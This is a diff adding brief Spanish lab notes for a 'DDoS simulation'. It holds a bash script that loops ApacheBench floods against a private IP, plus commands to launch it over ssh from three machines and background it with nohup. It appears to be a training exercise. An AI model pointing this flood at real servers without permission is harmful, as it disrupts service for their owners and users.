@@ -1,0 +1,24 @@
+SIMULACION DDOS
+----------------------------------------------
+INSTALAMOS:      sudo apt install apache2-utils -y
+nombre:"pruebados.sh"
+
+#!/bin/bash
+while true
+do
+    ab -n 2000 -c 200 http://192.168.1.100/
+    sleep 1
+done
+---------------------------------------------
+ATACANTE UNO :       antonio - manager (SUDOERS)
+PERMISOS:            chmod +x pruebados.sh
+EJECUTAR EL BASH:   ./pruebados.sh
+
+LANZARLO DESDE LA 3 MAQUINAS:
+ssh usuario@maquina1 "./pruebados.sh"
+ssh usuario@maquina2 "./pruebados.sh"
+ssh usuario@maquina3 "./pruebados.sh"
+--------------------------------------------
+PARARLO:      CTRL C
+MANDARLO A SEGUNDO PLANO:    nohup ./pruebados.sh &
+
